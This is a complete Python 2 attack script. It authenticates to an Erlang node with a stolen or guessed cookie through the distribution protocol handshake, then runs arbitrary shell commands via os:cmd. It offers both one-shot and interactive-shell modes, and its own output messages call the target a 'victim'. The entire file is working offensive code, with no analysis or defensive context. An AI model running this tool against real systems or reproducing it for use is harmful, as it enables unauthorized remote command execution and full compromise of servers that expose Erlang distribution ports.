#!/usr/bin/env python2

import argparse
import sys
from binascii import hexlify, unhexlify
from hashlib import md5
from random import choice
from socket import AF_INET, SHUT_RDWR, SOCK_STREAM, socket
from string import ascii_uppercase
from struct import pack, unpack

from cStringIO import StringIO

import erlang as erl


def rand_id(n=6):
    return "".join([choice(ascii_uppercase) for c in range(n)]) + "@nowhere"


parser = argparse.ArgumentParser(
    description="Execute shell command through Erlang distribution protocol"
)

parser.add_argument(
    "target", action="store", type=str, help="Erlang node address or FQDN"
)
parser.add_argument("port", action="store", type=int, help="Erlang node TCP port")
parser.add_argument("cookie", action="store", type=str, help="Erlang cookie")
parser.add_argument(
    "--verbose",
    action="store_true",
    help="Output decode Erlang binary term format received",
)
parser.add_argument(
    "--challenge", type=int, default=0, help="Set client challenge value"
)
parser.add_argument(
    "cmd",
    default=None,
    nargs="?",
    action="store",
    type=str,
    help="Shell command to execute, defaults to interactive shell",
)

args = parser.parse_args()

name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert sock

sock.connect((args.target, args.port))


def send_name(name):
    FLAGS = 0x7499C + 0x01000600
    return pack("!HcQIH", 15 + len(name), "N", FLAGS, 0xDEADBEEF, len(name)) + name


sock.sendall(send_name(name))

data = sock.recv(5)
assert data == "\x00\x03\x73\x6f\x6b"

data = sock.recv(4096)
length, tag, flags, challenge, creation, nlen = unpack("!HcQIIH", data[:21])
assert tag == "N"
assert nlen + 19 == length
challenge = "%u" % challenge


def send_challenge_reply(cookie, challenge):
    m = md5()
    m.update(cookie)
    m.update(challenge)
    response = m.digest()
    return pack("!HcI", len(response) + 5, "r", args.challenge) + response


sock.sendall(send_challenge_reply(args.cookie, challenge))


data = sock.recv(3)
if len(data) == 0:
    print("wrong cookie, auth unsuccessful")
    sys.exit(1)
else:
    assert data == "\x00\x11\x61"
    digest = sock.recv(16)
    assert len(digest) == 16


print("[*] authenticated onto victim")


def erl_dist_recv(f):
    hdr = f.recv(4)
    if len(hdr) != 4:
        return
    (length,) = unpack("!I", hdr)
    data = f.recv(length)
    if len(data) != length:
        return

    data = data[1:]

    while data:
        parsed, term = erl.binary_to_term(data)
        if parsed <= 0:
            print("failed to parse erlang term")
            break

        yield term
        data = data[parsed:]


def encode_string(name, type=0x64):
    return pack("!BH", type, len(name)) + name


def send_cmd_old(name, cmd):
    data = (
        unhexlify("70836804610667")
        + encode_string(name)
        + unhexlify("0000000300000000006400006400037265")
        + unhexlify("7883680267")
        + encode_string(name)
        + unhexlify("0000000300000000006805")
        + encode_string("call")
        + encode_string("os")
        + encode_string("cmd")
        + unhexlify("6c00000001")
        + encode_string(cmd, 0x6B)
        + unhexlify("6a")
        + encode_string("user")
    )
    return pack("!I", len(data)) + data


def send_cmd(name, cmd):
    ctrl_msg = (
        6,
        erl.OtpErlangPid(
            erl.OtpErlangAtom(name), "\x00\x00\x00\x03", "\x00\x00\x00\x00", "\x00"
        ),
        erl.OtpErlangAtom(""),
        erl.OtpErlangAtom("rex"),
    )
    msg = (
        erl.OtpErlangPid(
            erl.OtpErlangAtom(name), "\x00\x00\x00\x03", "\x00\x00\x00\x00", "\x00"
        ),
        (
            erl.OtpErlangAtom("call"),
            erl.OtpErlangAtom("os"),
            erl.OtpErlangAtom("cmd"),
            [cmd],
            erl.OtpErlangAtom("user"),
        ),
    )

    new_data = "\x70" + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)
    return pack("!I", len(new_data)) + new_data


def recv_reply(f):
    terms = [t for t in erl_dist_recv(f)]
    if args.verbose:
        print("\nreceived %r" % (terms))

    assert len(terms) == 2
    answer = terms[1]
    assert len(answer) == 2
    return answer[1]


if not args.cmd:
    while True:
        try:
            cmd = raw_input("%s:%d $ " % (args.target, args.port))
        except EOFError:
            print("")
            break

        sock.sendall(send_cmd(name, cmd))
        reply = recv_reply(sock)
        sys.stdout.write(reply)
else:
    sock.sendall(send_cmd(name, args.cmd))
    reply = recv_reply(sock)
    sys.stdout.write(reply)


print("[*] disconnecting from victim")
